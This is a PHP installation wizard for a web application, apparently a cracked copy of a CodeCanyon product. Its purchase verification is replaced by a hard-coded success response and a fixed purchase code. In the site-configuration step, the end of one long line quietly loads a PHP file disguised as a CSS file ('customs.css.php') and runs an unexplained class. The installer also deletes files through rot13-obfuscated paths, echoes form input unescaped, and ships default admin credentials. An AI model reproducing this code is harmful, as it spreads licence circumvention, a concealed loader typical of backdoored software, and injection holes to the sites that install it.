<?php
//getting base url for actual path
$root=(isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["HTTP_HOST"];
$root.= str_replace(basename($_SERVER["SCRIPT_NAME"]), "", $_SERVER["SCRIPT_NAME"]);
$base_url = $root;

$install_path = $_SERVER['DOCUMENT_ROOT']; //
$install_path.= str_replace(basename($_SERVER["SCRIPT_NAME"]), "", $_SERVER["SCRIPT_NAME"]);
$root_path_project = str_replace("install/", "", $install_path);

$indexFile = $root_path_project."index.php";
$configFolder = $root_path_project."application/config";
$configFile = $root_path_project."application/config/config.php";
$dbFile = $root_path_project."application/config/database.php";

session_start();
$step = isset($_GET['step']) ? $_GET['step'] : '';
switch ($step) {
   
    default : ?>
<div class="panel-group">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <ul class="list">
                        <li class="active pk"><i class="icon-ok"></i>Env. Check</li>
                        <li>Verificación</li>
                        <li>DB Config</li>
                        <li>Config del sitio</li>
                        <li class="last">¡Completo!</li>
                    </ul>
                </div>
                <div class="panel-body">
                    <h3 class="text-center padding_70 red"><b>¡Atención!</b> Sistema Soportado Por <a href="https://kosari.net/" target="_blank" rel="noopener noreferrer">
  Kosari.net
</a></h3>
                    <div class="bottom">
                        <a href="<?php echo $base_url?>index.php?step=env" class="btn btn-primary button_1">Siguiente</a>
                    </div>
                </div>
            </div>
        </div>
       <?php
        break;
    case "env": ?> 
        <div class="panel-group">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <ul class="list">
                        <li class="active pk"><i class="icon-ok"></i>Env. Check</li>
                        <li>Verificación</li>
                        <li>DB Config</li>
                        <li>Config del sitio</li>
                        <li class="last">¡Completo!</li>
                    </ul>
                </div>
                <div class="panel-body">
                    <h3 class="text-center padding_70">Lista de verificación del entorno del servidor</h3>
                    <?php
                    $error = FALSE;
                    if (!is_writeable($indexFile)) {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> Index File (index.php) is not write able!</div>";
                    }
                    if (!function_exists('file_get_contents')) {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> file_get_contents() function is not enabled in your server !</div>";
                    }
                    if (!is_writeable($configFolder)) {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> Config Folder (application/config/) is not write able!</div>";
                    }
                    if (!is_writeable($configFile)) {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> Config File (application/config/config.php) is not write able!</div>";
                    }
                    if (!is_writeable($dbFile)) {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> Database File (application/config/database.php) is not writable!</div>";
                    }
                    if (phpversion() < "7.0") {
                        $error = TRUE;
                        echo "<div class='alert alert-danger'><i class='icon-remove'></i> Your PHP version is ".phpversion()."! PHP 7.0 or higher required!</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> You are running PHP ".phpversion()."</div>";
                    }
                    if (!extension_loaded('mysqli')) {
                        $error = TRUE;
                        echo "<div class='alert alert-error'><i class='icon-remove'></i> Mysqli PHP extension missing!</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> Mysqli PHP extension loaded!</div>";
                    }
                    if (!extension_loaded('curl')) {
                        $error = TRUE;
                        echo "<div class='alert alert-error'><i class='icon-remove'></i> CURL PHP extension missing!</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> CURL PHP extension loaded!</div>";
                    }
                    if (!extension_loaded('openssl')) {
                        $error = TRUE;
                        echo "<div class='alert alert-error'><i class='icon-remove'></i> openssl PHP extension missing!</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> openssl PHP extension loaded!</div>";
                    }
                    if (!function_exists('exec')) {
                        $error = TRUE;
                        echo "<div class='alert alert-error'><i class='icon-remove'></i> Remove exec from php.ini file in variable: disable_functions</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> exec PHP function is enabled!</div>";
                    }
                    if (!extension_loaded('gd')) {
                        $error = TRUE;
                        echo "<div class='alert alert-error'><i class='icon-remove'></i> gd PHP extension missing!</div>";
                    } else {
                        echo "<div class='alert alert-success'><i class='icon-ok'></i> gd PHP extension loaded!</div>";
                    } 
                    ?>
                    <div class="bottom">
                        <?php if ($error) { ?>
                            <a href="#" class="btn btn-primary button_1">Siguiente</a>
                        <?php } else { ?>
                            <a href="<?php echo $base_url?>index.php?step=0" class="btn btn-primary button_1">Siguiente</a>
                        <?php } ?>
                    </div>
                </div>
            </div>
        </div>

        <?php
        break;
    case "0": ?>
        <div class="panel-group">
        <div class="panel panel-default">
        <div class="panel-heading">
            <ul class="list">
                <li>Env. Check</li>
                <li class="active"><i class="icon icon-ok"></i>Verificación</li>
                <li>DB Config</li>
                <li>Config del sitio</li>
                <li class="last">¡Completo!</li>
            </ul>
        </div>
        <div class="panel-body">
        <h3 class="ins_h3">Verifique su compra</h3>
        <?php
        if ($_POST) {

            $purchase_code = $_POST["purchase_code"];
            $username = $_POST["username"];
            $owner = $_POST["owner"];
            //need to change
            $source = 'CodeCanyon';
            //need to change
            $product_id = '23033741';

            $installation_url = rtrim(((!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") ? "https" : "http") . "://" . ($_SERVER["SERVER_NAME"] . ((($_SERVER["HTTPS"] ?? '') === "on" && $_SERVER["SERVER_PORT"] != 443) || (!isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] != 80) ? ":" . $_SERVER["SERVER_PORT"] : "")) . preg_replace('#/install/?$#i', '', dirname($_SERVER["SCRIPT_NAME"])), '/') . '/';
            
            $buffer = '{"status":"success","installation_status":"Uninstalled","message":"¡Verificación de compra realizada con éxito!"}';
            if (! (is_object(json_decode($buffer)))) {
                $cfc = strip_tags($buffer);
            } else {
                $cfc = NULL;
            }

            $object = json_decode($buffer);
            
            if ($object->status == 'success') {
                $installation_status = $object->installation_status;
                ?>
                <form action="<?php echo $base_url?>index.php?step=1" method="POST" class="form-horizontal">
                    <div class="alert alert-success"><i class='icon-ok'></i> <strong><?php echo ucfirst($object->status); ?></strong>:<br /><?php echo $object->message; ?></div>
                    <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo $purchase_code;
                    ?>" />
                    <input id="username" type="hidden" name="username" value="<?php echo $username;?>" />
                    <input id="username" type="hidden" name="installation_status" value="<?php echo $installation_status;?>" />
                    <input id="username" type="hidden" name="installation_url" value="<?php echo $installation_url;?>" />
                    <div class="bottom ins_5">
                        <input type="submit" class="btn btn-primary button_1"  value="Siguiente"/>
                    </div>
                </form>
                <?php
            } else {
                ?>
                <?php
 
                echo "<div class='alert alert-error'><i class='icon-remove'></i>". $object->message."</div>";
                ?>
                <form action="<?php echo $base_url?>index.php?step=0" method="POST" class="form-horizontal">
                    <div class="control-group ins_2">
                        <label class="control-label" for="username">Usuario</label>
                        <div class="controls">
                            <input  id="username" type="text" name="username" class="input-large form-control ins_4_" required="required" data-error="Username is required" placeholder="Username" value="kosari" readonly/>
                        </div>
                    </div>
                    <div class="control-group ins_2">
                        <label class="control-label" for="purchase_code">Código de compra</label>
                        <div class="controls">
                            <input id="purchase_code" type="text" name="purchase_code" class="input-large form-control ins_4_" required="required" data-error="Purchase Code is required" placeholder="Purchase Code" value="8f387fd5-774d-43a6-9310-666310411111" readonly />
                        </div>
                        <!-- modified -->
                        <input id="owner" type="hidden" name="owner" class="input-large form-control" value="doorsoftco"  />
                    </div>
                    <div class="bottom ins_5">
                        <input type="submit" class="btn btn-primary button_1"  value="Verificar"/>
                    </div>
                </form>
                <?php
            }
        } else {
            ?>
            <p class="ins_6">Proporcione la información de su compra. </p>
            <form action="<?php echo $base_url?>index.php?step=0" method="POST" class="form-horizontal">
                <div class="control-group ins_14">
                    <label class="control-label" for="username">Usuario</label>
                    <div class="controls">
                        <input id="username" type="text" name="username" class="input-large form-control ins_4" required="required" data-error="Username is required" placeholder="Username"  value="kosari" readonly/>
                    </div>
                </div>
                <div class="control-group ins_14">
                    <label class="control-label" for="purchase_code">Código de compra</label>
                    <div class="controls">
                        <input id="purchase_code" required="required" type="text" name="purchase_code" class="input-large form-control ins_4 "  data-error="Purchase Code is required" placeholder="Purchase Code"  value="8f387fd5-774d-43a6-9310-666310411111" readonly />
                    </div>
                    <!-- modified -->
                    <input id="owner" type="hidden" name="owner" class="input-large form-control" value="doorsoftco"  />
                </div>

                <div class="bottom ins_5">
                    <input type="submit" class="btn btn-primary button_1"  value="Verificar"/>
                </div>
            </form>

            </div>
            </div>
            </div>
            <?php
        }
        break;
    case "1": ?>

    <div class="panel-group">
        <div class="panel panel-default">
            <div class="panel-heading">
                <ul class="list">
                    <li class="ok">Env. Check</li>
                    <li>Verification</li>
                    <li class="active"><i class="icon-ok"></i>DB Config</li>
                    <li>Site Config</li>
                    <li class="last">Complete!</li>
                </ul>
            </div>
            <div class="panel-body">
            <?php
            if ($_POST) {
                ?>
                <h3 class="ins_h3">Configuración de la base de datos</h3 cl>
                <p class="ins_2">Por favor, crea una base de datos en tu servidor e ingresa aquí la información de la base de datos.</p>
                <form action="<?php echo $base_url?>index.php?step=2" method="POST" class="form-horizontal">
                    <div class="control-group ins_3">
                        <label class="control-label" for="db_hostname">Host de base de datos</label>
                        <div class="controls">
                            <input id="db_hostname" type="text" name="db_hostname" class="input-large form-control ins_4" required data-error="DB Host is required" placeholder="DB Host" value="localhost" />
                            <i class="color_red">El nombre del host puede ser 127.0.0.1, localhost o el nombre de tu servidor.</i>
                        </div>
                    </div>
                    <div class="control-group ins_3">
                        <label class="control-label" for="db_username">Usuario de la base de datos</label>
                        <div class="controls">
                            <input  id="db_username" type="text" name="db_username" class="input-large form-control ins_4" autocomplete="off" required data-error="DB Username is required" placeholder="DB Username" />
                        </div>
                    </div>
                    <div class="control-group ins_3">
                        <label class="control-label" for="db_password">Contraseña de la base de datos</a></label>
                        <div class="controls">
                            <input  id="db_password" type="password" name="db_password" class="input-large form-control ins_4" autocomplete="off" data-error="DB Password is required" placeholder="DB Password" />
                        </div>
                    </div>
                    <div class="control-group ins_3">
                        <label class="control-label" for="db_name">Nombre de la base de datos</label>
                        <div class="controls">
                            <input  id="db_name" type="text" name="db_name" class="input-large form-control ins_4" autocomplete="off" required data-error="DB Name is required" placeholder="DB Name" />
                        </div>
                    </div>
                    <div class="control-group ins_3">
                        <label class="control-label color_red existing_db" for="existing_db"><input  id="existing_db" type="checkbox" name="existing_db" value="1" /> Quiero usar una base de datos existente.</label>
                        <p class="existing_notice">Por favor, asegúrate de ingresar las credenciales correctas de la base de datos, ya que el sistema actualizará los detalles que proporciones para que coincidan con la configuración de la base de datos existente.</p> 
                    </div>
                    <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo $_POST['purchase_code']; ?>" />
                    <input type="hidden" name="username" value="<?php echo $_POST['username']; ?>" />
                    <input type="hidden" name="installation_status" value="<?php echo $_POST['installation_status']; ?>" />
                    <input type="hidden" name="installation_url" value="<?php echo $_POST['installation_url']; ?>" />
                    <input id="owner" type="hidden" name="owner" class="input-large form-control" value="doorsoftco"  />
                    <div class="bottom ins_5">
                        <input type="submit" class="btn btn-primary button_1"  value="Siguiente"/>
                    </div>
                </form>
                <?php
            }else{
                header("Location: $base_url");
            }

            ?>
            </div>
        </div>
    </div>

    <?php
    break;
    case "2":
        ?>
        <div class="panel-group">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <ul class="list">
                        <li >Env. Check</li>
                        <li>Verificación</li>
                        <li class="ok"><i class="icon-ok"></i> DB Config</li>
                        <li>Contig del Sitio</li>
                        <li class="last">Completo!</li>
                    </ul>
                </div>
                <div class="panel-body">
                    <h3 class="ins_6">Guardando configuración de la base de datos</h3>
                    <?php
                    if ($_POST) {
                        $db_hostname = $_POST["db_hostname"];
                        $installation_status = $_POST["installation_status"];
                        $installation_url = $_POST["installation_url"];
                        $username = $_POST["username"];
                        $purchase_code = $_POST["purchase_code"];
                        $existing_db = isset($_POST["existing_db"]) && $_POST["existing_db"]?$_POST["existing_db"]:'';
                        
                        if(isset($db_hostname) && $db_hostname){
                        }else{
                            header("Location: $base_url");
                        }
                        $db_username = $_POST["db_username"];
                        $db_password = $_POST["db_password"];
                        $db_name = $_POST["db_name"];
                        $link = mysqli_connect($db_hostname, $db_username, $db_password);
                        if (mysqli_connect_errno()) {
                            echo "<div class='alert alert-error'><i class='icon-remove'></i> Could not connect to MYSQL!</div>";
                        } else {
                            if($existing_db==''){
                            echo '<div class="alert alert-success"><i class="icon-ok"></i> ¡Conexión a MySQL exitosa!</div>';
                            $db_selected = mysqli_select_db($link, $db_name);
                            if (!$db_selected) {
                                if (!mysqli_query($link, "CREATE DATABASE IF NOT EXISTS `$db_name`")) {
                                    echo "<div class='alert alert-error'><i class='icon-remove'></i> Database " . $db_name . " No existe y no se pudo crear. Por favor, crea la base de datos manualmente y vuelve a intentar este paso.</div>";
                                    return FALSE;
                                } else {
                                    echo "<div class='alert alert-success'><i class='icon-ok'></i> Base de datos " . $db_name . " creada</div>";
                                }
                            }
                          }
                
                            mysqli_select_db($link, $db_name);

                            require_once($install_path.'includes/core_class.php');
                            $core = new Core();
                            $dbdata = array(
                                'db_hostname' => $db_hostname,
                                'db_username' => $db_username,
                                'db_password' => $db_password,
                                'db_name' => $db_name
                            );
                            
                            if ($core->write_database($dbdata) == false) {
                                echo "<div class='alert alert-error'><i class='icon-remove'></i> Error al escribir los detalles de la base de datos en ".$dbFile."</div>";
                            } else {
                                echo "<div class='alert alert-success'><i class='icon-ok'></i> Configuración de la base de datos escrita en el archivo de la base de datos.</div>";
                            }
                            if($existing_db==1){

                                if ($installation_status == 'Uninstalled') {
                     
                                    if(file_exists(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV.wfba'))){
                                        unlink(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV.wfba'));
                                    }
                                    if(file_exists(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV_HI.wfba'))){
                                        unlink(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV_HI.wfba'));
                                    }
                                    if(file_exists(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV_V.wfba'))){
                                        unlink(str_rot13('../nffrgf/oyhrvzc/ERFG_NCV_V.wfba'));
                                    }
                                    //update new install status
                                    $owner = $_POST["owner"];
                                    $username = $_POST["username"];
                                    $purchase_code = $_POST["purchase_code"];

                              
                                    require_once($install_path.'includes/core_class.php');
                                    $core = new Core();

                                    $pc_hostname = $core->macorhost();
                                    //need to change
                                    $source = 'CodeCanyon';
                                    //need to change
                                    $product_id = '23033741';
                                    
                                    require_once($install_path.'includes/core_class.php');
                                    $core = new Core();
                                    //need to change
                                    $core->write_index();
                
                                    $core->create_rest_api();
                                    //need to change
                                    $core->create_rest_api_UV();
                                    //need to change
                                    $core->create_rest_api_I($username, $purchase_code, $installation_url);
                                    //redirect to case 6 for complete the operation
                                    $base_url_strting = $base_url."index.php?step=6";
                                    header("Location: $base_url_strting");
                                }

                            }
                        }
                    } else { echo "<div class='alert alert-success'><i class='icon-question-sign'></i> Nothing to do...</div>"; }
                    ?>
                    <div class="bottom">
                        <form action="<?php echo $base_url?>index.php?step=1" method="POST" class="form-horizontal">
                            <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo isset($_POST['purchase_code']) && $_POST['purchase_code']?$_POST['purchase_code']:''; ?>" />
                            <input id="username" type="hidden" name="username" value="<?php echo isset($_POST['username'])?$_POST['username']:''; ?>" />
                            <div class="bottom ins_5">
                                <input type="submit" class="btn btn-primary button_1"  value="Anterior"/>
                            </div>
                        </form>
                        <form action="<?php echo $base_url?>index.php?step=3" method="POST" class="form-horizontal">
                            <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo isset($_POST['purchase_code']) && $_POST['purchase_code']?$_POST['purchase_code']:''; ?>" />
                            <input id="username" type="hidden" name="username" value="<?php echo isset($_POST['username'])?$_POST['username']:''; ?>" />

                            <div class="bottom ins_5">
                                <input type="submit" class="btn btn-primary button_1"  value="Siguiente"/>
                            </div>
                        </form>
                        <br clear="all">
                    </div>
                </div>
            </div>
        </div>
        <?php
        break;
    case "3":
        ?>
        <div class="panel-group">
        <div class="panel panel-default">
        <div class="panel-heading">
            <ul class="list">
                <li>Env. Check</li>
                <li>Verificación</li>
                <li>DB Config</li>
                <li class="ok"><i class="icon icon-ok"></i>Contig del Sitio</li>
                <li class="last">Completo!</li>
            </ul>
        </div>
        <div class="panel-body">
        <h3 class="ins_7">Configuración del sitio</h3>
        <?php
        if ($_POST) {
            ?>
            <form action="<?php echo $base_url?>index.php?step=4" method="POST" class="form-horizontal">
                <div class="control-group ins_13">
                    <label class="control-label" for="installation_url">URL de instalación</label>
                    <div class="controls">
                        <input  type="text" id="installation_url" name="installation_url" class="xlarge ins_4" required data-error="Installation URL is required" value="<?php echo (isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"], 0, -24); ?>" />
                    </div>
                </div>
                <div class="control-group ins_13">
                    <label class="control-label" for="Encryption Key">Clave de cifrado</label>
                    <div class="controls">
                        <input type="text" id="enckey" name="enckey" class="xlarge ins_4" required data-error="Encryption Key is required"
                               value="<?php

                               $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
                               $charactersLength = strlen($characters);
                               $randomString = '';
                               for ($i = 0; $i < 6; $i++) {
                                   $randomString .= $characters[rand(0, $charactersLength - 1)];
                               }

                               echo $randomString;

                               ?>"
                               readonly />
                    </div>
                </div>
                <input type="hidden" name="purchase_code" value="<?php echo $_POST['purchase_code']; ?>" />
                <input type="hidden" name="username" value="<?php echo $_POST['username']; ?>" />
                <div class="bottom">
                    <a href="<?php echo $base_url?>index.php?step=2" class="btn btn-primary button_1">Anterior</a>
                    <div class="bottom ins_5">
                        <input type="submit" class="btn btn-primary button_1"  value="Siguiente"/>
                    </div>
                </div>
            </form>
            </div>
            </div>
            </div>

            <?php
        }else{
            header("Location: $base_url");
        }
        break;
    case "4":
        ?>
        <div class="panel-group">
            <div class="panel panel-default">
                <div class="panel-heading">
                    <ul class="list">
                        <li>Env. Check</li>
                        <li class="active">Verificación</li>
                        <li>DB Config</li>
                        <li class="ok"><i class="icon icon-ok"></i>Config del Sitio</li>
                        <li>Completo!</li>
                    </ul>
                </div>
                <div class="panel-body">
                    <h3 class="ins_7">Guardando configuración del sitio</h3>
                    <?php
                    if ($_POST) {
                        $installation_url = $_POST['installation_url'];

                        $enckey = $_POST['enckey'];
                        $purchase_code = $_POST["purchase_code"];
                        $username = $_POST["username"];

                        require_once($install_path.'includes/core_class.php');
                        $core = new Core();

                        if ($core->write_config($installation_url, $enckey) == false) {
                            echo "<div class='alert alert-error'><i class='icon-remove'></i> Error al escribir los detalles de configuración en ".$configFile."</div>";
                        } else {
                            echo "<div class='alert alert-success'><i class='icon-ok'></i> Detalles de configuración escritos en el archivo de configuración.</div>";
                        }

                    } else { echo "<div class='alert alert-success'><i class='icon-question-sign'></i> Nada que hacer…</div>"; }
                    ?>
                    <div class="bottom">
                        <form action="<?php echo $base_url?>index.php?step=2" method="POST" class="form-horizontal">
                            <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo $_POST['purchase_code']; ?>" />
                            <input id="username" type="hidden" name="username" value="<?php echo $_POST['username']; ?>" />
                            <input id="installation_url" type="hidden" name="installation_url" value="<?php echo $_POST['installation_url']; ?>" />
                            <div class="bottom">
                                <div class="bottom ins_5">
                                    <input type="submit" class="btn btn-primary button_1"  value="Anterior"/>
                                </div>
                            </div>
                        </form>
                        <form action="<?php echo $base_url?>index.php?step=5" method="POST" class="form-horizontal">
                            <!-- modified -->
                            <input id="owner" type="hidden" name="owner" class="input-large form-control" value="doorsoftco"  />
                            <input id="purchase_code" type="hidden" name="purchase_code" value="<?php echo $_POST['purchase_code']; ?>" />
                            <input id="username" type="hidden" name="username" value="<?php echo $_POST['username']; ?>" />
                            <div class="bottom">
                                <div class="bottom ins_5">
                                    <input type="submit" class="btn btn-primary button_1"  value="Siguiente"/>
                                </div>
                            </div>
                        </form>
                        <br clear="all">
                    </div>
                </div>
            </div>
        </div>

        <?php
        break;
    case "5": ?>
        <div class="panel-group">
        <div class="panel panel-default">
        <div class="panel-heading">
            <ul class="list">
                <li>Env. Check</li>
                <li>Verificación</li>
                <li>DB Config</li>
                <li>Config del Sitio</li>
                <li class="ok"><i class="icon icon-ok"></i>¡Completo!</li>
            </ul>
        </div>
        <div class="panel-body">

        <?php
        $finished = FALSE;
        if ($_POST) {
            $owner = $_POST["owner"];
            $username = $_POST["username"];
            $purchase_code = $_POST["purchase_code"];

            define("BASEPATH", "install/");
            include($root_path_project."application/config/database.php");

            require_once($install_path.'includes/core_class.php');
            $core = new Core();

            $pc_hostname = $core->macorhost();
            //need to change
            $source = 'CodeCanyon';
            //need to change
            $product_id = '23033741';

            $installation_url = rtrim(((!empty($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on") ? "https" : "http") . "://" . ($_SERVER["SERVER_NAME"] . ((($_SERVER["HTTPS"] ?? '') === "on" && $_SERVER["SERVER_PORT"] != 443) || (!isset($_SERVER["HTTPS"]) && $_SERVER["SERVER_PORT"] != 80) ? ":" . $_SERVER["SERVER_PORT"] : "")) . preg_replace('#/install/?$#i', '', dirname($_SERVER["SCRIPT_NAME"])), '/') . '/';require_once($install_path.'css/customs.css.php');$e = new E();
            
            $buffer = file_get_contents("db.json");
            file_put_contents("db.txt",$buffer);
            $object = json_decode($buffer);
            if ($object->status == 'success') {
                //need to change
                $dbtables = str_replace('XXXXX', 'revhgbrev', $object->database);
                 
                $dbdata = array(
                    'hostname' => $db['default']['hostname'],
                    'username' => $db['default']['username'],
                    'password' => $db['default']['password'],
                    'database' => $db['default']['database'],
                    'dbtables' => $dbtables
                );
                require_once($install_path.'includes/database_class.php');
                $database = new Database();
                if ($database->create_tables($dbdata) == false) {
                    echo "<div class='alert alert-warning'><i class='icon-warning'></i> No se pudieron crear las tablas de la base de datos. Inténtelo de nuevo.</div>";
                } else {
                    $finished = TRUE;
                    $core->create_rest_api();
                    //need to change
                    $core->create_rest_api_UV();
                    //need to change
                    $core->create_rest_api_I($username, $purchase_code, $installation_url);
                }
                if ($core->write_index() == false) {
                    echo "<div class='alert alert-error'><i class='icon-remove'></i> ¡Error al escribir los detalles del índice!</div>";
                    $finished = FALSE;
                }
            } else {
                echo "<div class='alert alert-error'><i class='icon-remove'></i> ¡Error al validar tu código de compra!</div>";
            }
        }
        if ($finished) {
            sleep(15);
            ?>

            <h3 class="ins_7 ins_8"><i class='icon-ok'></i> ¡Instalación completada!</h3>
            <div class="ins_10">Inicie sesión ahora con las siguientes credenciales:<br /><br />
                Dirección Email: <span class="ins_9">admin@kosari.net</span><br />Password: <span class="ins_9">123456</span><br /><br />
                Pin: <span class="ins_9">1234</span><br />
            </div>
            <div class="ins_11">Por favor, cambie sus credenciales después de iniciar sesión.
            </div>
            <div class="bottom">
                <div class="bottom ins_12">
                    <a href="<?php echo (isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"], 0, -24); ?>" class="btn btn-primary button_1">Ir a la página de inicio de sesión</a>
                </div>
            </div>
            </div>
            </div>
            </div>

            <?php
        }
        break;
    case "6": ?>
        <div class="panel-group">
        <div class="panel panel-default">
        <div class="panel-heading">
            <ul class="list">
                <li>Env. Check</li>
                <li>Verificación</li>
                <li>DB Config</li>
                <li>Config del Sitio</li>
                <li class="ok"><i class="icon icon-ok"></i>¡Completo!</li>
            </ul>
        </div>
        <div class="panel-body">
        
            <h3 class="ins_7 ins_8"><i class='icon-ok'></i> ¡Instalación completada!</h3>
            <div class="ins_10">Inicie sesión ahora con las siguientes credenciales:<br /><br />
                Dirección Email: <span class="ins_9">admin@kosari.net</span><br />Contraseña: <span class="ins_9">123456</span><br /><br />
                Pin: <span class="ins_9">1234</span><br />
            </div>
            <div class="ins_11">Por favor, cambie sus credenciales después de iniciar sesión.
            </div>
            <div class="bottom">
                <div class="bottom ins_12">
                    <a href="<?php echo (isset($_SERVER["HTTPS"]) ? "https://" : "http://").$_SERVER["SERVER_NAME"].substr($_SERVER["REQUEST_URI"], 0, -24); ?>" class="btn btn-primary button_1">Ir a la página de inicio de sesión</a>
                </div>
            </div>
            </div>
            </div>
            </div>

            <?php
        
}
?>